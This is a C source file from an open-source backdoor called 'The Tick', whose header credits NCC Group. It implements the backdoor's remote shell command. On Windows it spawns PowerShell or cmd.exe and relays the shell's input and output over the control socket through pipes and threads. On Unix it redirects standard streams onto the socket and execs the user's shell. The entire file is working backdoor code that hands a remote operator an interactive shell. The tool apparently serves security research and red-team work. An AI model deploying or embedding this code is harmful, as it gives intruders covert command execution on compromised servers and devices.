/*
 * The Tick, a simple backdoor for servers and embedded systems.
 * 
 * Developed by Mario Vilas, mvilas@gmail.com
 * http://www.github.com/MarioVilas/thetick
 * 
 * Originally released as open source by NCC Group Plc - http://www.nccgroup.com/
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
*/

#include "shell.h"

#include "tcp.h"
#include "stream.h"

// Windows version. Enough spaghetti to feed half of Italy.
#ifdef _WIN32

typedef struct{
    int sock;
    HANDLE pipe;
} _stub_shell_thread_params;

DWORD WINAPI _stub_pipe_to_socket(LPVOID lpParam);
DWORD WINAPI _stub_socket_to_pipe(LPVOID lpParam);

// Implements the "shell" command.
void do_system_shell(Parser *p)
{
    char shell[MAX_PATH];
    _stub_shell_thread_params *thread_args_1 = NULL;
    _stub_shell_thread_params *thread_args_2 = NULL;
    DWORD success = 0;
    DWORD dwAttrib = INVALID_FILE_ATTRIBUTES;
    HANDLE readStdIn = INVALID_HANDLE_VALUE;
    HANDLE writeStdIn = INVALID_HANDLE_VALUE;
    HANDLE readStdOut = INVALID_HANDLE_VALUE;
    HANDLE writeStdOut = INVALID_HANDLE_VALUE;
    HANDLE hHeap = GetProcessHeap();
    HANDLE hThread_1 = INVALID_HANDLE_VALUE;
    HANDLE hThread_2 = INVALID_HANDLE_VALUE;
    SECURITY_ATTRIBUTES sa;
    PROCESS_INFORMATION pi;
    STARTUPINFO si;

    // Disable this command if SSL is enabled.
    // This is tricky to implement so I'm leaving it for later.
#if TICK_FEATURES_CRYPTO
    if (p->use_ssl) {
        LOG("TODO implement do_system_shell() on SSL connections\n");
        parser_error(p, "operation not yet supported on encrypted connections");
        return;
    }
#endif

    // Search for PowerShell. If it is available, that will be our remote shell.
    // Note that the path to *all* versions of PowerShell is always the same.
    memset(shell, 0, sizeof(shell));
    if (ExpandEnvironmentStringsA("%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", shell, sizeof(shell)-2)) {
        dwAttrib = GetFileAttributes(shell);
        if ((dwAttrib == INVALID_FILE_ATTRIBUTES || (dwAttrib & FILE_ATTRIBUTE_DIRECTORY))) {
            LOG("PowerShell not found! Tried: %s\n", shell);
            shell[0] = 0;
        }
    } else {
        shell[0] = 0;
    }

    // If PowerShell was not found, try cmd.exe.
    if (shell[0] == 0) {
        if (GetEnvironmentVariable("ComSpec", shell, sizeof(shell)) != 0 && shell[0] != 0) {
            dwAttrib = GetFileAttributes(shell);
            if ((dwAttrib == INVALID_FILE_ATTRIBUTES || (dwAttrib & FILE_ATTRIBUTE_DIRECTORY))) {
                LOG("cmd.exe not found! Tried: %s\n", shell);
                shell[0] = 0;
            }
        } else {
            shell[0] = 0;
        }
    }

    // If for some reason the environment variables are missing, hardcode a default.
    if (shell[0] == 0) {
        strcpy(shell, "C:\\Windows\\System32\\cmd.exe");
        dwAttrib = GetFileAttributes(shell);
        if ((dwAttrib == INVALID_FILE_ATTRIBUTES || (dwAttrib & FILE_ATTRIBUTE_DIRECTORY))) {
            LOG("cmd.exe not found! Tried: %s\n", shell);
            shell[0] = 0;
        }
    }

    // If we don't have a shell at this point, give up.
    if (shell[0] == 0) {
        LOG("Cannot find a shell for the current user\n");
        parser_error(p, "no shell available");
        return;
    }

    // The background threads to pipe the shell will need to know the handles.
    // For memory safety we need to use the heap for this.
    thread_args_1 = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(_stub_shell_thread_params));
    thread_args_2 = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(_stub_shell_thread_params));
    if (thread_args_1 == NULL || thread_args_2 == NULL) {
        HeapFree(hHeap, 0, thread_args_1);
        HeapFree(hHeap, 0, thread_args_2);
        parser_error(p, "memory error");
        return;
    }

    // Create the pipes for input and output.
    memset(&sa, 0, sizeof(sa));
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;
    success |= CreatePipe(&readStdIn, &writeStdIn, &sa, 0);
    success |= CreatePipe(&readStdOut, &writeStdOut, &sa, 0);
    success |= SetHandleInformation(writeStdIn, HANDLE_FLAG_INHERIT, 0);
    success |= SetHandleInformation(readStdOut, HANDLE_FLAG_INHERIT, 0);
    if ( ! success ) {
        HeapFree(hHeap, 0, thread_args_1);
        HeapFree(hHeap, 0, thread_args_2);
        CloseHandle(readStdIn);
        CloseHandle(writeStdIn);
        CloseHandle(readStdOut);
        CloseHandle(writeStdOut);
        parser_error(p, "error creating pipes");
        return;
    }

    // Create the shell process in suspended mode.
    memset(&si, 0, sizeof(si));
    memset(&pi, 0, sizeof(pi));
    si.cb = sizeof(STARTUPINFO);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = readStdIn;
    si.hStdOutput = writeStdOut;
    si.hStdError = writeStdOut;
    success |= CreateProcessA(shell, shell, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    if ( ! success ) {
        HeapFree(hHeap, 0, thread_args_1);
        HeapFree(hHeap, 0, thread_args_2);
        CloseHandle(readStdIn);
        CloseHandle(writeStdIn);
        CloseHandle(readStdOut);
        CloseHandle(writeStdOut);
        parser_error(p, "error creating process");
        return;
    }

    // Launch the background threads that will pipe the shell input and output.
    // We will also launch these in suspended state.
    thread_args_1->pipe = readStdOut;
    thread_args_1->sock = p->fd;
    thread_args_2->sock = p->fd;
    thread_args_2->pipe = writeStdIn;
    hThread_1 = CreateThread(NULL, 0, &_stub_pipe_to_socket, thread_args_1, CREATE_SUSPENDED, NULL);
    hThread_2 = CreateThread(NULL, 0, &_stub_socket_to_pipe, thread_args_2, CREATE_SUSPENDED, NULL);
    if (hThread_1 == NULL || hThread_2 == NULL) {
        TerminateProcess(pi.hProcess, 0);
        TerminateThread(hThread_1, 0);
        TerminateThread(hThread_2, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        CloseHandle(hThread_1);
        CloseHandle(hThread_2);
        HeapFree(hHeap, 0, thread_args_1);
        HeapFree(hHeap, 0, thread_args_2);
        CloseHandle(readStdIn);
        CloseHandle(writeStdIn);
        CloseHandle(readStdOut);
        CloseHandle(writeStdOut);
        parser_error(p, "error creating threads");
        return;
    }

    // Everything seems to be in order at this point.
    // Send the OK status before piping the shell, since we'll be reusing the channel.
    parser_ok(p);

    // Resume execution in all the threads.
    // We don't check for errors here because if there is one, there's nothing to do.
    ResumeThread(pi.hThread);
    ResumeThread(hThread_1);
    ResumeThread(hThread_2);

    // Close the handles we don't need anymore.
    // The heap allocated memory is freed by the threads.
    // The pipe handles are closed when the shell session ends.
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hThread_1);
    CloseHandle(hThread_2);

    // Our protocol parser will "forget" the socket, forcing a reconnect.
    // We do not actually close the socket since it's still in use.
    p->fd = -1;
    parser_close(p);

    // Log the event.
    LOG("Launched remote shell: %s\n", shell);
}

// This function runs in a background thread.
DWORD WINAPI _stub_pipe_to_socket(LPVOID lpParam)
{
    // Fetch the arguments and free the memory.
    _stub_shell_thread_params *thread_args = lpParam;
    HANDLE pipe = thread_args->pipe;
    int sock = thread_args->sock;
    HeapFree(GetProcessHeap(), 0, lpParam);

    // Copy the stream.
    copy_stream((STREAM_T) pipe, STREAM_HANDLE, sock, STREAM_SOCKET, -1);

    // Close all the handles and exit.
    shutdown(sock, 2);
    closesocket(sock);
    CloseHandle(pipe);
    ExitThread(0);
}

// This function runs in a background thread.
DWORD WINAPI _stub_socket_to_pipe(LPVOID lpParam)
{
    // Fetch the arguments and free the memory.
    _stub_shell_thread_params *thread_args = lpParam;
    HANDLE pipe = thread_args->pipe;
    int sock = thread_args->sock;
    HeapFree(GetProcessHeap(), 0, lpParam);

    // Copy the stream.
    copy_stream(sock, STREAM_SOCKET, (STREAM_T) pipe, STREAM_HANDLE, -1);

    // Close all the handles and exit.
    shutdown(sock, 2);
    closesocket(sock);
    CloseHandle(pipe);
    ExitThread(0);
}

// Unix version. I can hear the angels sing on my way out of Windows hell.
#else

// Implements the "shell" command.
void do_system_shell(Parser *p)
{
    char *shell = NULL;
    char *argv[2];

    // Disable this command if SSL is enabled.
    // This is tricky to implement so I'm leaving it for later.
#if TICK_FEATURES_CRYPTO
    if (p->use_ssl) {
        LOG("TODO implement do_system_shell() on SSL connections\n");
        parser_error(p, "operation not yet supported on encrypted connections");
        return;
    }
#endif

    // Find out what our shell is.
    shell = getenv("SHELL");

    // If for some odd reason we don't have a SHELL variable, hardcode a default.
    if (shell == NULL) {
        shell = "/bin/sh";
    }

    // Test if the file actually exists and we have execution permission.
    if (access(shell, X_OK) == -1) {
        LOG("Cannot find a shell for the current user\n");
        parser_error(p, "no shell available");
        return;
    }

    // Send the OK status before invoking the shell, since we'll be reusing the channel.
    parser_ok(p);

    // Fork the process.
    if (fork() == 0) {

        // The new process will invoke the shell and pipe it though the socket.
        // The socket timeout values will be disabled.
        setsockopt(p->fd, SOL_SOCKET, SO_RCVTIMEO, NULL, 0);
        setsockopt(p->fd, SOL_SOCKET, SO_SNDTIMEO, NULL, 0);
        dup2(p->fd, 0);
        dup2(p->fd, 1);
        dup2(p->fd, 2);
        argv[0] = shell;
        argv[1] = NULL;
        execvp(shell, argv);

    } else {

        // The parent process will "forget" the connection.
        close(p->fd);
        p->fd = -1;
        parser_close(p);

    }
    LOG("Launched remote shell\n");
}

#endif
